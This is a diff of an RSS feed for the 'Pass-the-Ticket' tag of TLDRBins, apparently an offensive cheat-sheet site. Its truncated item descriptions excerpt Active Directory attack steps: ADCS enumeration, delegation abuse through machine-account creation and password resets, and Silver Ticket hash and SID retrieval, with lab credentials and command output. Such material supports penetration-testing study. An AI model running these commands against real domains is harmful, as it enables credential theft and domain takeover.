@@ -6,15 +6,7 @@
     <description>Recent content in Pass-the-Ticket on TLDRBins</description>
     <generator>Hugo</generator>
     <language>en-us</language>
-    <lastBuildDate>Sat, 23 Nov 2024 00:00:00 +0000</lastBuildDate>
     <atom:link href="https://tldrbins.github.io/@pass-the-ticket/index.xml" rel="self" type="application/rss+xml" />
-    <item>
-      <title>Unconstrained Delegation</title>
-      <link>https://tldrbins.github.io/unconstrained_delegation/</link>
-      <pubDate>Sat, 23 Nov 2024 00:00:00 +0000</pubDate>
-      <guid>https://tldrbins.github.io/unconstrained_delegation/</guid>
-      <description>Abuse #1: Capture Ticket Windows 1. Check TRUSTED_FOR_DELEGATION . .\PowerView.ps1 Get-DomainComputer PS C:\programdata&amp;gt; Get-DomainComputer ---[SNIP]--- logoncount : 131 badpasswordtime : 12/31/1600 4:00:00 PM distinguishedname : CN=SRV002,CN=Computers,DC=Example,DC=local objectclass : {top, person, organizationalPerson, user...} badpwdcount : 0 displayname : SRV002$ lastlogontimestamp : 11/23/2024 2:29:01 AM objectsid : S-1-5-21-422340810-923920092-1608110645-1103 samaccountname : SRV002$ localpolicyflags : 0 codepage : 0 samaccounttype : MACHINE_ACCOUNT countrycode : 0 cn : SRV002 accountexpires : NEVER whenchanged : 11/23/2024 2:26:27 PM instancetype : 4 usncreated : 16398 objectguid : e54dc358-b87f-49ad-8bcf-2029bf051006 operatingsystem : Windows Server 2019 Standard operatingsystemversion : 10.</description>
-    </item>
     <item>
       <title>Abuse Parent-Child Domain Trusts</title>
       <link>https://tldrbins.github.io/abuse_parent_child_domain_trusts/</link>
@@ -27,7 +19,7 @@
       <link>https://tldrbins.github.io/adcs/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/adcs/</guid>
-      <description>Enum (From Linux) certipy-ad nxc # Password certipy-ad find -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -target &amp;lt;TARGET&amp;gt; -text -stdout -vulnerable # NTLM certipy-ad find -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -hashes &amp;#39;&amp;lt;HASH&amp;gt;&amp;#39; -target &amp;lt;TARGET&amp;gt; -text -stdout -vulnerable # Password nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -M adcs # NTLM nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -H &amp;#39;&amp;lt;HASH&amp;gt;&amp;#39; -M adcs Enum (From Windows) powershell certify ADCSTemplate # Check ADCS service net start | findstr /i cert # Check env certutil # List cert templates certutil -catemplates # Get info of each template .</description>
+      <description>Enum (From Linux) certipy-ad nxc # Password certipy-ad find -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -target &amp;lt;TARGET&amp;gt; -text -stdout -vulnerable # NTLM certipy-ad find -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -hashes &amp;#39;&amp;lt;HASH&amp;gt;&amp;#39; -target &amp;lt;TARGET&amp;gt; -text -stdout -vulnerable # Kerberos certipy-ad find -u &amp;#39;&amp;lt;USER&amp;gt;@&amp;lt;DOMAIN&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -k -target &amp;lt;TARGET&amp;gt; -text -stdout -vulnerable -dc-host &amp;lt;DC&amp;gt; -ns &amp;lt;DC_IP&amp;gt; # Password nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -M adcs # NTLM nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -H &amp;#39;&amp;lt;HASH&amp;gt;&amp;#39; -M adcs Enum (From Windows) powershell certify ADCSTemplate # Check ADCS service net start | findstr /i cert # Check env certutil # List cert templates certutil -catemplates # Get info of each template .</description>
     </item>
     <item>
       <title>AllowedToDelegate</title>
@@ -76,14 +68,21 @@
       <link>https://tldrbins.github.io/seenabledelegationprivilege/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/seenabledelegationprivilege/</guid>
-      <description>Abuse #1: Constrained Delegation Linux Windows 1. Control of a Machine Account bloodyAD -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --host &amp;lt;DC&amp;gt; set password &amp;#39;&amp;lt;TARGET_MACHINE&amp;gt;$&amp;#39; &amp;#39;&amp;lt;NEW_PASSWORD&amp;gt;&amp;#39; $ bloodyAD -d REDELEGATE.VL -u &amp;#39;HELEN.FROST&amp;#39; -p &amp;#39;Fall2024!&amp;#39; --host DC.REDELEGATE.VL set password &amp;#39;FS01$&amp;#39; &amp;#39;Fall2024!&amp;#39; [+] Password changed successfully! 2. Set msDS-AllowedToDelegateTo to Target SPN bloodyAD -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --host &amp;lt;DC&amp;gt; set object &amp;#39;CN=&amp;lt;TARGET_MACHINE&amp;gt;,CN=COMPUTERS,DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; &amp;#39;msDS-AllowedToDelegateTo&amp;#39; -v &amp;#39;ldap/&amp;lt;DC&amp;gt;&amp;#39; $ bloodyAD -u &amp;#39;HELEN.FROST&amp;#39; -p &amp;#39;Fall2024!&amp;#39; -d &amp;#39;REDELEGATE.</description>
+      <description>Abuse #1: Unconstrained Delegation Linux Windows 1. Check Machine Quota # Password nxc ldap &amp;lt;DC&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; -M maq $ nxc ldap DC1.delegate.vl -u &amp;#39;N.Thompson&amp;#39; -p &amp;#39;KALEB_2341&amp;#39; -d delegate.vl -M maq LDAP 10.10.72.178 389 DC1 [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl) LDAP 10.10.72.178 389 DC1 [+] delegate.vl\N.Thompson:KALEB_2341 MAQ 10.10.72.178 389 DC1 [*] Getting the MachineAccountQuota MAQ 10.10.72.178 389 DC1 MachineAccountQuota: 10 2. Create a Computer # Password impacket-addcomputer -computer-name &amp;#39;&amp;lt;NEW_COMPUTER&amp;gt;&amp;#39; -computer-pass &amp;#39;&amp;lt;NEW_PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC_IP&amp;gt; &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; $ impacket-addcomputer -computer-name &amp;#39;EvilComputer&amp;#39; -computer-pass &amp;#39;Test1234&amp;#39; -dc-ip 10.</description>
     </item>
     <item>
       <title>Silver Ticket</title>
       <link>https://tldrbins.github.io/silver_ticket/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/silver_ticket/</guid>
-      <description>Silver Ticket Attack Linux Windows 1. Get Service Principle Name (SPN) [Optional] sudo ntpdate -s &amp;lt;DC_IP&amp;gt; &amp;amp;&amp;amp; impacket-GetUserSPNs &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -request -k # If NTLM auth is disabled sudo ntpdate -s &amp;lt;DC_IP&amp;gt; &amp;amp;&amp;amp; impacket-GetUserSPNs &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-host &amp;lt;DC&amp;gt; -request -k 2. Generate NTLM iconv -f ASCII -t UTF-16LE &amp;lt;(printf &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39;) | openssl dgst -md4 $ iconv -f ASCII -t UTF-16LE &amp;lt;(printf &amp;#39;REGGIE1234ronnie&amp;#39;) | openssl dgst -md4 MD4(stdin)= 1443ec19da4dac4ffc953bca1b57b4cf 3. Get Domain SID sudo ntpdate -s &amp;lt;DC_IP&amp;gt; &amp;amp;&amp;amp; impacket-getPac -targetUser administrator &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; $ sudo ntpdate -s dc.</description>
+      <description>Silver Ticket Attack Linux Windows 1. Get Service Principle Name (SPN) [Optional] sudo ntpdate -s &amp;lt;DC_IP&amp;gt; &amp;amp;&amp;amp; impacket-GetUserSPNs &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC_IP&amp;gt; -request -k # If NTLM auth is disabled sudo ntpdate -s &amp;lt;DC_IP&amp;gt; &amp;amp;&amp;amp; impacket-GetUserSPNs &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-host &amp;lt;DC&amp;gt; -request -k 2. Generate NTLM iconv -f ASCII -t UTF-16LE &amp;lt;(printf &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39;) | openssl dgst -md4 $ iconv -f ASCII -t UTF-16LE &amp;lt;(printf &amp;#39;REGGIE1234ronnie&amp;#39;) | openssl dgst -md4 MD4(stdin)= 1443ec19da4dac4ffc953bca1b57b4cf 3. Get Domain SID sudo ntpdate -s &amp;lt;DC_IP&amp;gt; &amp;amp;&amp;amp; impacket-getPac -targetUser administrator &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; $ sudo ntpdate -s dc.</description>
+    </item>
+    <item>
+      <title>Unconstrained Delegation</title>
+      <link>https://tldrbins.github.io/unconstrained_delegation/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/unconstrained_delegation/</guid>
+      <description>Abuse #1: Capture Ticket Windows 1. Check TRUSTED_FOR_DELEGATION . .\PowerView.ps1 Get-DomainComputer PS C:\programdata&amp;gt; Get-DomainComputer ---[SNIP]--- logoncount : 131 badpasswordtime : 12/31/1600 4:00:00 PM distinguishedname : CN=SRV002,CN=Computers,DC=Example,DC=local objectclass : {top, person, organizationalPerson, user...} badpwdcount : 0 displayname : SRV002$ lastlogontimestamp : 11/23/2024 2:29:01 AM objectsid : S-1-5-21-422340810-923920092-1608110645-1103 samaccountname : SRV002$ localpolicyflags : 0 codepage : 0 samaccounttype : MACHINE_ACCOUNT countrycode : 0 cn : SRV002 accountexpires : NEVER whenchanged : 11/23/2024 2:26:27 PM instancetype : 4 usncreated : 16398 objectguid : e54dc358-b87f-49ad-8bcf-2029bf051006 operatingsystem : Windows Server 2019 Standard operatingsystemversion : 10.</description>
     </item>
     <item>
       <title>Winrm</title>
